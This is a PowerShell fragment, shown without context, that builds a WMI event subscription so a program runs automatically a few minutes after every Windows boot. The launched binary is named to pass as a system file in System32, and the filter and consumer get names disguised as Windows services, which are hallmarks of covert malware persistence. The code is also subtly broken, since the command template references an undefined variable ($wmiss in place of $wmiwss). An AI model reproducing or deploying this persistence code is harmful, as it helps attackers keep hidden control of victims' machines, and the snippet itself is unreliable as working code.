$usrbin = "C:\Windows\System32\winsystray.exe"
    $EventFilterName = 'wmisvc'
    $EventConsumerName = 'wmiusrlgn'
    $wmiwss = "powershell.exe -nop -c `"$usrbin`""

    # Create event filter
    $EventFilterArgs = @{
        EventNamespace = 'root/cimv2'
        Name = $EventFilterName
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
        QueryLanguage = 'WQL'
    }

    $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

    # Create CommandLineEventConsumer
    $CommandLineConsumerArgs = @{
        Name = $EventConsumerName
        CommandLineTemplate = $wmiss
    }
    $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

    # Create FilterToConsumerBinding
    $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
    }
    $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs